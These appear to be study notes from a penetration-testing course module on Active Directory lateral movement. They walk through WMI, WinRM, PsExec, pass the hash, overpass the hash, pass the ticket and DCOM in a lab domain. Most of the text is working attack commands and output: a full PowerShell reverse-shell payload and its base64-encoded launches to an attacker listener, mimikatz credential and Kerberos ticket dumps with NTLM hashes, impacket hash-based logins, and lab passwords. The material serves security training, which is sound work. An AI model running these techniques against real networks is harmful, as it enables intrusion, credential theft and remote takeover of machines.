# Lateral Movement in Active Directory
In previous Modules, we located high-value targets that could lead to an Active Directory compromise and found the workstations or servers they are logged in to
+ We gathered password hashes then recovered and leveraged existing tickets for Kerberos authentication

Next, we will use lateral movement to compromise the machines these high-value domain users are logged in to

A logical next step in our approach would be to crack any password hashes we have obtained and authenticate to a machine with clear text passwords to gain unauthorized access
+ However, password cracking takes time and may fail
+ In addition, Kerberos and NTLM do not use the clear text password directly and native tools from Microsoft do not support authentication using the password hash

In this Module, we will explore different lateral movement techniques that allow us to authenticate to a system and gain code execution using a user's hash or a Kerberos ticket

## Active Directory Lateral Movement Techniques
Lateral Movement is a tactic consisting of various techniques aimed to gain further access within the target network
+ As described in the MITRE Framework, these techniques may use the current valid account or reuse authentication material such as password hashes, Kerberos tickets, and application access tokens obtained from the previous attack stages

Will explore various techniques that involve both valid accounts and previously retrieved credentials
+ Should also remind ourselves that what we've learned about enumerating Active Directory domains will still be relevant in the lateral movement attack phase as we might have gained access to previously undiscovered networks

### WMI and WinRM

#### WMI
The first lateral movement technique we are going to cover is based on the _Windows Management Instrumentation_ (WMI),which is an object-oriented feature that facilitates task automation.
+ WMI is capable of creating processes via the _Create_ method from the _Win32_Process_ class
+ It communicates through _Remote Procedure Calls_ (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data

To demonstrate this attack technique, we'll first briefly showcase the _wmic_ utility, which has been recently deprecated, and then we'll discover how to conduct the same WMI attack via PowerShell

In order to create a process on the remote target via WMI, we need credentials of a member of the _Administrators_ local group, which can also be a domain user
+ In the following examples, we are going to perform the attacks as the user _jen_, which is both a domain user and a member of the Local Administrator group for the target machines

We already encountered _UAC remote restrictions_ for non-domain joined machines in the _Password Attacks_ Module
+ However this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit

Historically, wmic has been abused for lateral movement via the command line by specifying the target IP after the **/node:** argument then user and password after the **/user:** and **/password:** keywords, respectively
+ We'll also instruct wmic to launch a calculator instance with the **process call create** keywords
+ We can test the command by connecting as _jeff_ on CLIENT74
+ Usage:
``` PowerShell
wmic /node:<IP> /user:<USER> /password:<PASS> <COMMAND>
```
+ Example:
``` PowerShell
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```

The WMI job returned the PID of the newly created process and a return value of "0", meaning that the process has been created successfully
+ System processes and services always run in session 0 as part of session isolation, which was introduced in Windows Vista
+ Because the WMI Provider Host is running as a system service, newly created processes through WMI are also spawned in session 0

Translating this attack into PowerShell syntax requires a few extra details
+ We need to create a _PSCredential_ object that will store our session username and password
+ To do that, we will first store the username and password in the respective variables and then secure the password via the **ConvertTo-SecureString** cmdlet
+ Finally, we'll create a new PSCredential object with the given username and **secureString** object
``` PowerShell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

Next, we want to create a _Common Information Model_ (CIM) via the **New-CimSession** cmdlet
+ ll first specify DCOM as the protocol for the WMI session with the **New-CimSessionOption** cmdlet on the first line
+ On the second line, we'll create the new session against our target IP and supply the PSCredential object along with the session options
+ Lastly, we'll define 'calc' as the payload to be executed by WMI
``` PowerShell
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
```

As a final step, we need to tie together all the arguments we configured previously by issuing the _Invoke-CimMethod_ cmdlet and supplying **Win32_Process** and **Create** as _ClassName_ and _MethodName_, respectively
``` PowerShell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

To simulate the technique, we can connect to CLIENT74 as _jeff_ and insert the above code in a PowerShell prompt:
``` PowerShell
PS C:\Users\jeff> $username = 'jen';
...
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3712           0 192.168.50.73
```

Verifying the active processes on the target machine reveals that a new calculator process has been launched, confirming that our attack has succeeded:
![[Pasted image 20240107145924.png]]


To further improve our craft, we could replace the previous payload with a full reverse shell written in PowerShell
+ First, we'll encode the PowerShell reverse shell so we don't need to escape any special characters when inserting it as a WMI payload
+ The following Python code encodes the PowerShell reverse shell to base64 contained in the _payload_ variable and then prints the result to standard output
+ As reviewing the entire PowerShell payload is outside the scope of this Module, we should replace the highlighted IP and port with the ones of our attacker Kali machine
``` python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

Once we have saved the Python script, we can run it and retrieve the output to use later
``` Shell
kali@kali:~$ python3 encode.py
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

After setting up a Netcat listener on port 443 on our Kali machine, we can move on to client74 and run the PowerShell WMI script with the newly generated encoded reverse-shell payload:
``` PowerShell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     3948           0 192.168.50.73
```
+ We can conclude that the process creation has been successful and switch to our listener for a final confirmation:
``` Shell
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> hostname
FILES04

PS C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd64> whoami
corp\jen
```

Nice! We indeed managed to move laterally and gain privileges as the _jen_ domain user on an internal server by abusing WMI features

#### WinRM
As an alternative method to WMI for remote management, WinRM can be employed for remote hosts management
+ WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS
+ It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as _winrs_ (Windows Remote Shell)

The winrs utility can be invoked by specifying the target host through the _-r:_ argument and the username and password with _-u:_ and _-p_, respectively
+ As a final argument, we want to specify the commands to be executed on the remote host
+ For example, we want to run the hostname and whoami commands to prove that they are running on the remote target
+ Since winrs only works for domain users, we'll execute the whole command once we've logged in as _jeff_ on CLIENT74 and provide _jen's_ credentials as command arguments
+ Usage
``` PowerShell
winrs -r:<HOSTNAME> -u:<USER> -p:<PASSWORD>  "<COMMAND>"
```
+ Example
``` Powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```
+ The output confirms that we have indeed executed the commands remotely on FILES04
+ **NOTE**: For WinRS to work, the domain user needs to be part of the **Administrators** or **Remote Management Users** group on the target host

To convert this technique into a full lateral movement scenario, we just need to replace the previous commands with the base64 encoded reverse-shell we wrote earlier:
``` PowerShell
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

Once we run the above command after having set up a Netcat listener, we are welcomed with a reverse-shell from FILE04:
``` Shell
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
PS C:\Users\jen> hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
```

PowerShell also has WinRM built-in capabilities called _PowerShell remoting_, which can be invoked via the _`New-PSSession`_ cmdlet by providing the IP of the target host along with the credentials in a credential object format similar to what we did previously:
``` PowerShell
$username = '<USER>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
+ Example:
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available
```

To interact with the session ID 1 we created, we can issue the **Enter-PSSession** cmdlet followed by the session ID 
``` PowerShell
Enter-PSSession <ID>
```
+ Example:
``` PowerShell
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen

[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```
+ Once more, we've proven that the session is originating from the target host through yet another lateral movement technique

Can also use: `evil-winrm -i <IP> -u <USER>`
### PsExec
PsExec is a very versatile tool that is part of the SysInternals suite developed by Mark Russinovich
+ It's intended to replace telnet-like applications and provide remote execution of processes on other systems through an interactive console

In order to misuse this tool for lateral movement, a few requisites must be met
+ To begin, the user that authenticates to the target machine needs to be part of the Administrators local group
+ In addition, the _ADMIN$_ share must be available and File and Printer Sharing has to be turned on
+ Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems

In order to execute the command remotely, PsExec performs the following tasks:
- Writes **psexesvc.exe** into the **C:\Windows** directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of **psexesvc.exe**

For this scenario, let's assume we have RDP access as the _offsec_ local administrator on CLIENT74 as we already discovered its clear-text password on FILES04
+ Even though PsExec is not installed by default on Windows, we can easily transfer it on our compromised machine
+ For the sake of usability, the whole SysInternals suite is available on CLIENT74
+ Once logged in as the _offsec_ user on CLIENT74, we can run the 64-bit version of PsExec from **`C:\Tools\SysinternalsSuite`**

In order to start an interactive session on the remote host, we need to invoke **PsExec64.exe** with the **-i** argument, followed by the target hostname prepended with two backslashes
+ We'll then specify **corp\jen** as domain\username and **Nexus123!** as password with the **-u** and **-p** arguments respectively
+ Lastly, we include the process we want to execute remotely, which is a command shell in this case
``` PowerShell
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```
+ Above confirms that we obtained an interactive shell directly on the target system as the local administrator _jen_ domain account, without involving our Kali machine to catch a reverse shell

Can also use: `impacket-psexec <USER>@<IP>`

### Pass the Hash
The _Pass the Hash_ (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password
+ Note that this will not work for Kerberos authentication but only for servers or services using NTLM authentication
+ This lateral movement sub-technique is also mapped in the MITRE Framework under the Use Alternate Authentication Material general technique

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including _PsExec_ from Metasploit, _Passing-the-hash toolkit_, and _Impacket_
+ The mechanics behind them are more or less the same in that the attacker connects to the victim using the _Server Message Block_ (SMB) protocol and performs authentication using the NTLM hash

Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using _Named Pipes_
+ This is done using the Service Control Manager API
+ Unless we want to gain remote code execution, PtH does not need to create a Windows service for any other usage, such as accessing an SMB share

Similar to PsExec, this technique requires an SMB connection through the firewall (commonly port 445) and the Windows File and Printer Sharing feature to be enabled
+ These requirements are common in internal enterprise environments

This lateral movement technique also requires the admin share called **ADMIN$** to be available
+ In order to establish a connection to this share, the attacker must present valid credentials with local administrative permissions
+ In other words, this type of lateral movement typically requires local administrative rights

Note that PtH uses the NTLM hash legitimately
+ However, the vulnerability lies in the fact that we gained unauthorized access to the password hash of a local administrator

To demonstrate this, we can use _wmiexec_ from the Impacket suite from our local Kali machine against the local administrator account on FILES04
+ We are going to invoke the command by passing the local Administrator hash that we gathered in a previous Module and then specifying the username along with the target IP
``` Shell
/usr/bin/impacket-wmiexec -hashes :<HASH> <USER>@<IP>
```
+ Example:
``` Shell
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```
+ In this case, we used NTLM authentication to obtain code execution on the Windows 2022 server directly from Kali, armed only with the user's NTLM hash
+ If the target was sitting behind a network that was only reachable through our initial compromised access, we could perform this very same attack by pivoting and proxying through the first host as learned in previous Modules
+ This method works for Active Directory domain accounts and the built-in local administrator account
+ However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account

### Overpass the Hash
With _overpass the hash_, we can "over" abuse an NTLM user hash to gain a full Kerberos _Ticket Granting Ticket_ (TGT)
+ Then we can use the TGT to obtain a _Ticket Granting Service_ (TGS)

To demonstrate this, let's assume we have compromised a workstation (or server) that _jen_ has authenticated to
+ We'll also assume that the machine is now caching their credentials (and therefore, their NTLM password hash)

To simulate this cached credential, we will log in to the Windows 10 CLIENT76 machine as _jeff_ and run a process as _jen_, which prompts authentication
+ The simplest way to do this is to right-click the Notepad icon on the desktop then shift-left click "show more options" on the popup, yielding the options below
![[Pasted image 20240107183632.png]]

From here, we enter **jen** as the username along with the associated password, which will launch Notepad in the context of that user
+ After successful authentication, _jen_'s credentials will be cached on this machine
+ We can validate this with the **`sekurlsa::logonpasswords`** command from **mimikatz** after having spawned an Administrative shell
+ The command will dump the cached password hashes:
``` Shell
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords

...
Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session           : Interactive from 0
User Name         : jen
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/27/2023 7:43:20 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1124
        msv :
         [00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075
         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
        tspkg :
        wdigest :
         * Username : jen
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jen
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
...
```
+ This output shows _jen_'s cached credentials under _jen_'s own session
+ It includes the NTLM hash, which we will leverage to overpass the hash

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication
+ A simple way to do this is with the **`sekurlsa::pth`** command from Mimikatz:
+ The command requires a few arguments and creates a new PowerShell process in the context of _jen_
+ This new PowerShell prompt will allow us to obtain Kerberos tickets without performing NTLM authentication over the network, making this attack different than a traditional pass-the-hash

As the first argument, we specify **/user:** and **/domain:**, setting them to **jen** and **corp.com** respectively
+ We'll specify the NTLM hash with **/ntlm:** and finally, use **/run:** to specify the process to create (in this case, PowerShell)
+ Usage in Mimikatz:
```
sekurlsa::pth /user:<USER> /domain:<DONMAIN> /ntlm:<HASH> /run:<COMMAND>
```
+ Example:
```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8716
  |  TID  8348
  |  LSA Process is now R/W
  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
  \_ kerberos - data copy @ 000001F3D5D366C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
```

At this point, we have a new PowerShell session that allows us to execute commands as _jen_
+ At this point, running the _whoami_ command on the newly created PowerShell session would show _jeff_'s identity instead of _jen_
+ While this could be confusing, this is the intended behavior of the _whoami_ utility which only checks the current process's token and it does not inspect any imported kerberos tickets

Let's list the cached Kerberos tickets with **klist**:
```
klist
```
+ Example output:
```
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (0)
```

No Kerberos tickets have been cached, but this is expected since _jen_ has not yet performed an interactive login
+ Let's generate a TGT by authenticating to a network share on the files04 server with **`net use`**
```
PS C:\Windows\system32> net use \\files04
The command completed successfully.

PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```
+ The output indicates that the **net use** command was successful
+ We then used **klist** to list the newly requested Kerberos tickets, including a TGT and a TGS for the _Common Internet File System_ (CIFS) service
+ We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft
+ PsExec can run a command remotely but does not accept password hashes
+ Since we have generated Kerberos tickets and operate in the context of _jen_ in the PowerShell session, we may reuse the TGT to obtain code execution on the files04 host
+ Let's try that now, running **.\PsExec.exe** to launch **cmd** remotely on the `\\files04` machine as _jen_
``` PowerShell
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```
+ As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server
+ We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to gain remote code execution on behalf of another user

### Pass the Ticket
In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos
+ We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility

The _Pass the Ticket_ attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service
+ In addition, if the service tickets belong to the current user, then no administrative privileges are required

In this scenario, we are going to abuse an already existing session of _dave_
+ The _dave_ user has privileged access to the _backup_ folder located on WEB04 where our logged in user _jen_ does not

To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject _dave_'s WEB04 TGS into our own session
+ This will allow us to access the restricted folder

Let's first log in as _jen_ to CLIENT76 and verify that we are unable to access the resource on WEB04
+ To do so, we'll try to list the content of the `\\web04\backup` folder from an administrative PowerShell command line session:
```
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Confirming that _jen_ has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the **`sekurlsa::tickets /export`** command:
```
sekurlsa::tickets /export
```
+ Example:
```
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export

Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 6:24:17 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
...
```

The above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format
+ Because inspecting the generated tickets indicates that _dave_ had initiated a session, we can try to inject one of their tickets inside _jen_'s sessions
+ We can verify newly generated tickets with **dir**, filtering out on the **kirbi** extension
```
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
```
+ These are the saved kerberos ticket files

As many tickets have been generated, we can just pick any TGS ticket in the **`dave@cifs-web04.kirbi`** format and inject it through mimikatz via the **kerberos::ptt** command:
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
+ Example output:
```
* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```
+ No errors have been thrown, meaning that we should expect the ticket in our session when running `klist`:
```
PS C:\Tools> klist

Current LogonId is 0:0x13bca7

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

We notice that the _dave_ ticket has been successfully imported in our own session for the _jen_ user
+ Let's confirm we have been granted access to the restricted shared folder:
```
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```
+ We managed to successfully access the folder by impersonating _dave_'s identity after injecting its authentication token into our user's process

### DCOM
In this section, we will inspect a fairly recent lateral movement technique that exploits the _Distributed Component Object Model_ (DCOM) and learn how it can be abused for lateral movement

The Microsoft _Component Object Model_ (COM) is a system for creating software components that interact with each other
+ While COM was created for either same-process or cross-process interaction, it was extended to _Distributed Component Object Model_ (DCOM) for interaction between multiple computers over a network

Both COM and DCOM are very old technologies dating back to the very first editions of Windows
+ Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API

Cybereason documented a collection of various DCOM lateral movement techniques, including one discovered by Matt Nelson, which we are covering in this section
+ The discovered DCOM lateral movement technique is based on the _Microsoft Management Console_ (MMC) COM application that is employed for scripted automation of Windows systems

The MMC Application Class allows the creation of Application Objects, which expose the _ExecuteShellCommand_ method under the _Document.ActiveView_ property
+ As its name suggests, this method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators

We are going to demonstrate this lateral movement attack as the _jen_ user logged in from the already compromised Windows 11 CLIENT74 host
+ From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the _GetTypeFromProgID_ method:
```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
+ Once the application object is saved into the _$dcom_ variable, we can pass the required argument to the application via the **ExecuteShellCommand** method
+ The method accepts four parameters: **Command**, **Directory**, **Parameters**, and **WindowState**
+ We're only interested in the first and third parameters, which will be populated with **cmd** and **/c calc**, respectively:
```
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

Once we execute these two PowerShell lines from CLIENT74, we should have spawned an instance of the calculator app
+ Because it's within Session 0, we can verify the calculator app is running with **tasklist** and filtering out the output with **findstr**
```
C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                 4764 Services                   0     12,132 K
```

We can now improve our craft by extending this attack to a full reverse shell similar to what we did in the _WMI and WinRM_ section earlier in this Module
+ Having generated the base64 encoded reverse shell with our Python script, we can replace our DCOM payload with it:
```
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

Switching to our Kali machine, we can verify any incoming connections on the listener that we simultaneously set up
```
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778

PS C:\Windows\system32> whoami
corp\jen

PS C:\Windows\system32> hostname
FILES04
```
+ We gained a foothold on an additional internal box by abusing the DCOM MMC application

In this Learning Unit, we learned the theory behind a number of lateral movement attacks and how to execute them from compromised clients
